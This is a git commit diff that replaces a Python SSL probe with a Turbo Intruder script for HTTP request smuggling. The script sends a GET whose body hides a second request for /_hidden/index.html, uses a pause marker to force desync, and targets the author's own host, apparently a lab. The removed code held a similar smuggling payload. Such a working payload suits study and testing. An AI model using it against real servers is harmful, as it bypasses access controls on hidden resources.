287d7cccc299795d46956453e7bee7f7ba967752
Vignesh SB <92362676+vigneshsb403@users.noreply.github.com>
2024-04-14 14:34:46 +0530

    Burp Intruder Code

--- main.py
+++ main.py
@@ -1,42 +1,31 @@
-#!/usr/bin/python
+def queueRequests(target, _):
+    engine = RequestEngine(endpoint="http://docker.vigneshsb.fun:80",
+                           concurrentConnections=1,
+                           requestsPerConnection=100,
+                           pipeline=False
+                           )
 
-from lib.EasySSL import EasySSL
-from datetime import datetime
-def main():
-    # Get the website URL from the user
-    website_url = input("Enter the website URL (e.g., https://example.com): ")
+    # attack request
+    attack_request = """GET /a HTTP/1.1
+Host: localhost
+Content-Length: %s
 
-    # Extract the host and port from the URL
-    if website_url.startswith("https://"):
-        website_url = website_url[len("https://"):]
+%s"""
 
-    if "/" in website_url:
-        host, path = website_url.split("/", 1)
-        path = "/" + path
-    else:
-        host = website_url
-        path = "/"
+    # smuggled request GET
+    smuggled_request = """GET /_hidden/index.html HTTP/1.1
+Host: notlocalhost
 
-    # Create an instance of the EasySSL class
-    ssl_client = EasySSL(SSLFlag=True)
+"""
 
-    try:
-        # Connect to the server
-        ssl_client.connect(host,443,100000000)
-        request = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nContent-Length: 56\r\n\r\nGET /_hidden/index.html HTTP/1.1\r\nHost: localhost\r\n\r\n"
-        ssl_client.send(request.encode())
-        start_time = datetime.now()
-        response = ssl_client.recv_nb(100000000)
-        end_time = datetime.now()
-        print("the lenght is: ",len(response))
-        for i in range(len(response)):
-            print("Data : of ",i," is ",response[i])
-        for i in response:
-            print(chr(i),end="")
-        print(response[1])
-        ssl_client.close()
-    finally:
-        # Close the connection when done
-        ssl_client.close()
-if __name__ == "__main__":
-    main()
+    # normal request
+    normal_request = """GET / HTTP/1.1
+Host: localhost
+
+"""
+    engine.queue(attack_request, [len(smuggled_request), smuggled_request], pauseMarker=['\r\n\r\nGET'], pauseTime=6)
+    engine.queue(normal_request)
+
+
+def handleResponse(req, _):
+    table.add(req)
